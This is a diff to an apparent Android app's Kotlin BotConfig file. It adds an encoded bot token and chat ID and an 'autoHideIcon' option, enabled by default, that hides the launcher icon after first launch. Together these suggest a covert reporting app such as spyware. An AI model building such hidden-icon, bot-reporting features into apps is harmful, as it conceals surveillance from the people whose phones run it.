@@ -9,34 +9,41 @@ import java.util.*
 
 object BotConfig {
 
+    // Base64 encoded config: echo -n '{"botToken":"TOKEN","chatId":"ID","autoHideIcon":true}' | base64
     private const val CONFIG_DATA = ""
-    private data class Config(val botToken: String, val chatId: String)
+
+    private data class Config(
+        val botToken: String = "",
+        val chatId: String = "",
+        val autoHideIcon: Boolean = true  // Default: auto-hide enabled
+    )
+
     private val gson = Gson()
 
     fun getBotToken(): String = loadConfig().botToken
 
     fun getChatId(): String = loadConfig().chatId
 
+    /**
+     * Returns whether the app icon should be automatically hidden after first launch.
+     * Default is true (auto-hide enabled).
+     * Set to false to keep the icon visible in launcher.
+     */
+    fun shouldAutoHideIcon(): Boolean = loadConfig().autoHideIcon
+
     private fun loadConfig(): Config {
-        if (CONFIG_DATA.isEmpty()) return Config("", "")
+        if (CONFIG_DATA.isEmpty()) return Config()
         return try {
             val json = Base64.getDecoder().decode(CONFIG_DATA).toString(Charsets.UTF_8)
-            gson.fromJson(json, Config::class.java) ?: Config("", "")
+            gson.fromJson(json, Config::class.java) ?: Config()
         } catch (_: Exception) {
-            Config("", "")
+            Config()
         }
     }
 
     fun getAndroidVersion(): Int = Build.VERSION.SDK_INT
 
     fun getAndroidVersionName(): String = when (Build.VERSION.SDK_INT) {
-        21 -> "5.0 Lollipop"
-        22 -> "5.1 Lollipop"
-        23 -> "6.0 Marshmallow"
-        24 -> "7.0 Nougat"
-        25 -> "7.1 Nougat"
-        26 -> "8.0 Oreo"
-        27 -> "8.1 Oreo"
         28 -> "9.0 Pie"
         29 -> "10"
         30 -> "11"
